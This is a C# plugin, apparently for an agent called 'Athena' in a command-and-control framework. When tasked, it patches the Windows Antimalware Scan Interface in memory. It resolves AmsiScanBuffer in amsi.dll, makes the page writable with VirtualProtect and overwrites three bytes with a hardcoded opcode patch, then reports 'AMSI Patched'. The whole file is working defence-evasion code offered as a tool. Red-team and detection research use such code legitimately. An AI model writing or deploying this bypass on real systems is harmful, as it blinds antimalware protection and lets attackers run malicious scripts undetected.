using PluginBase;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace Athena
{
    public static class Plugin
    {
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
        public static ResponseResult Execute(Dictionary<string, object> args)
        {
            try
            {

                if (Patch())
                {
                    return new ResponseResult
                    {
                        completed = "true",
                        user_output = "AMSI Patched",
                        task_id = (string)args["task-id"], //task-id passed in from Athena
                    };
                }
                else
                {
                    return new ResponseResult
                    {
                        completed = "true",
                        user_output = "Failed to patch AMSI",
                        task_id = (string)args["task-id"], //task-id passed in from Athena
                        status = "error"
                    };
                }
            }
            catch (Exception e)
            {
                //oh no an error
                return new ResponseResult
                {
                    completed = "true",
                    user_output = e.Message,
                    task_id = (string)args["task-id"],
                    status = "error"
                };
            }
        }
        public static bool Patch()
        {
            IntPtr amsiDll = LoadLibrary("amsi.dll");
            if (amsiDll == IntPtr.Zero)
            {
                return false;
            }

            IntPtr pAmsi = GetProcAddress(amsiDll, "AmsiScanBuffer");
            if (pAmsi == IntPtr.Zero)
            {
                return false;
            }

            UIntPtr dwSize = (UIntPtr)4;
            uint Zero = 0;

            if (!VirtualProtect(pAmsi, dwSize, 0x40, out Zero))
            {
                return false;
            }

            Byte[] Patch = { 0x31, 0xff, 0x90 }; //The new patch opcode

            IntPtr ptr = Marshal.AllocHGlobal(3);
            Marshal.Copy(Patch, 0, ptr, 3);

            MoveMemory(pAmsi + 0x001b, ptr, 3);
            return true;
        }
    }

}
